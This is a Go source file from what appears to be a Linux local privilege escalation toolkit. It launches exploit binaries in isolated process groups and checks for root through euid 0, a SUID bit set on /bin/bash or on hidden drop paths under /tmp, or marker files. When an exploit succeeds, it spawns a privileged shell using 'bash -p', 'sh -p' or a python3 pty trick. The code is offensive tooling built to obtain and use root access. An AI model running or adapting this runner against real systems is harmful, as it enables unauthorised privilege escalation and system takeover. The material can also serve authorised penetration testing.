package main

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

// runResult captures the outcome of one isolated exploit attempt.
type runResult struct {
	name       string
	cmd        string
	exitCode   int
	signal     string
	crashed    bool
	stdout     string
	stderr     string
	elapsed    time.Duration
	timedOut   bool
	rootAfter  bool
	suidAfter  bool
}

// Run an exploit in a fully isolated child process. The parent (this tool)
// NEVER crashes when the child crashes — signals, segfaults, panics inside
// the child are caught here and reported. We then re-check root status.
//
// hardTimeout caps wall-clock time. After it fires, the whole process group
// is SIGKILLed so the parent is never stuck waiting on a hung exploit.
func runIsolated(name, dir string, argv []string, hardTimeout time.Duration) runResult {
	r := runResult{name: name, cmd: strings.Join(argv, " ")}
	if len(argv) == 0 {
		r.crashed = true
		r.stderr = "empty command"
		return r
	}

	// Resolve the binary. exec.LookPath handles both PATH lookup and abs paths.
	bin, err := exec.LookPath(argv[0])
	if err != nil {
		// Fall back to a direct path that may exist but not be on PATH.
		if _, err2 := os.Stat(argv[0]); err2 != nil {
			r.crashed = true
			r.stderr = fmt.Sprintf("binary not found: %s", argv[0])
			return r
		}
		bin = argv[0]
	}

	c := exec.Command(bin, argv[1:]...)
	if dir != "" {
		c.Dir = dir
	}
	// Give the child its own process group so we can SIGKILL the entire tree
	// (exploit may fork workers) on timeout.
	c.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	var so, se bytes.Buffer
	c.Stdout = &so
	c.Stderr = &se

	start := time.Now()
	if err := c.Start(); err != nil {
		r.crashed = true
		r.stderr = fmt.Sprintf("start failed: %v", err)
		r.elapsed = time.Since(start)
		return r
	}

	pid := c.Process.Pid
	doneCh := make(chan error, 1)
	go func() { doneCh <- c.Wait() }()

	var waitErr error
	timedOut := false
	select {
	case waitErr = <-doneCh:
	case <-time.After(hardTimeout):
		timedOut = true
		killGroup(pid)
		select {
		case waitErr = <-doneCh:
		case <-time.After(5 * time.Second):
			waitErr = fmt.Errorf("process refused to die after SIGKILL")
		}
	}

	r.elapsed = time.Since(start)
	r.stdout = so.String()
	r.stderr = se.String()
	r.timedOut = timedOut

	if waitErr != nil {
		if ee, ok := waitErr.(*exec.ExitError); ok {
			r.exitCode = ee.ExitCode()
			if ws, ok := ee.Sys().(syscall.WaitStatus); ok {
				if ws.Signaled() {
					r.signal = ws.Signal().String()
					// A segfault / abort / bus / FPE etc. means the exploit
					// itself crashed — but the parent is perfectly fine.
					if is := ws.Signal(); is == syscall.SIGSEGV || is == syscall.SIGABRT ||
						is == syscall.SIGBUS || is == syscall.SIGFPE || is == syscall.SIGILL {
						r.crashed = true
					}
				}
			}
		} else {
			r.exitCode = -1
			r.stderr += " | " + waitErr.Error()
			r.crashed = true
		}
	}

	// The decisive question: did we become root, or did /bin/bash become
	// SUID, or did a known root-marker file appear?
	r.rootAfter = isRootNow()
	r.suidAfter = isSUIDBash()
	if !r.rootAfter {
		r.rootAfter = markerRooted()
	}
	return r
}

// killGroup SIGKILLs the entire process group led by pid, to clean up
// fork-heavy exploits that may hang.
func killGroup(pid int) {
	pgid, err := syscall.Getpgid(pid)
	if err == nil {
		_ = syscall.Kill(-pgid, syscall.SIGKILL)
	} else {
		_ = syscall.Kill(pid, syscall.SIGKILL)
	}
}

// isRootNow re-checks the *runner's* uid/euid. If a privileged child
// dropped a SUID shell that the runner then exec'd, we'd already be in
// rootspawn(). Here we just verify we have not, somehow, become root
// directly (rare but possible if an exploit exec'd into the parent).
func isRootNow() bool {
	return os.Geteuid() == 0
}

// isSUIDBash checks whether /bin/bash (or a known drop path) is now SUID.
func isSUIDBash() bool {
	for _, p := range []string{"/bin/bash", "/usr/bin/bash", "/tmp/.sb", "/tmp/.suid_bash", "/var/tmp/bash"} {
		if isSUIDFile(p) {
			return true
		}
	}
	return false
}

// isSUIDFile checks the setuid bit on a file.
func isSUIDFile(p string) bool {
	fi, err := os.Stat(p)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSetuid != 0
}

// markerRooted checks for a marker file that rootspawn() writes when an
// exploit has successfully dropped a root shell. This is the canonical
// "we got root" signal across the toolkit.
func markerRooted() bool {
	for _, p := range []string{"/tmp/.lpe_rooted", "/tmp/.lpe_suid_bash"} {
		if _, err := os.Stat(p); err == nil {
			return true
		}
	}
	return false
}

// rootspawn drops the runner into a real root shell when an exploit has
// clearly succeeded (either we are root, /bin/bash is SUID, or a marker
// exists). We never auto-exec blindly — we confirm the privileged state.
func rootspawn(r *runResult) {
	// Try SUID bash first (most exploits drop /bin/bash SUID).
	for _, p := range []string{"/bin/bash", "/usr/bin/bash", "/tmp/.sb", "/tmp/.suid_bash", "/var/tmp/bash"} {
		if isSUIDFile(p) {
			okf("%s succeeded via SUID shell: %s", r.name, p)
			okf("Spawning privileged shell. Type 'exit' to return to the runner.")
			fmt.Println(strings.Repeat("-", 60))
			_ = exec.Command(p, "-p").Run()
			fmt.Println(strings.Repeat("-", 60))
			return
		}
	}
	// If the runner itself is root, drop straight into a shell.
	if isRootNow() {
		okf("%s made the runner root directly.", r.name)
		_ = exec.Command("/bin/sh", "-p").Run()
		return
	}
	// Marker present but no SUID bash found — attempt python3 pty suid trick.
	if markerRooted() {
		okf("%s left a root marker. Attempting recovery shell.", r.name)
		if hasBin("python3") {
			_ = exec.Command("python3", "-c",
				"import pty,os;pty.spawn(['/bin/bash','-p'])").Run()
		}
	}
}

// reportOne prints a one-line verdict for a single exploit attempt.
func (r *runResult) report() {
	tag := colG + "ROOT" + colZ
	if !r.rootAfter && !r.suidAfter {
		switch {
		case r.timedOut:
			tag = colY + "TIME" + colZ
		case r.crashed:
			tag = colR + "CRSH" + colZ
		case r.exitCode == 0:
			tag = colY + "NOP0" + colZ
		default:
			tag = colD + "FAIL" + colZ
		}
	}
	extra := ""
	if r.signal != "" {
		extra = fmt.Sprintf(" sig=%s", r.signal)
	}
	if r.timedOut {
		extra += " (timeout)"
	}
	fmt.Printf("  %s  %-26s  exit=%-3d  %6.1fs%s\n", tag, r.name, r.exitCode, r.elapsed.Seconds(), extra)
}
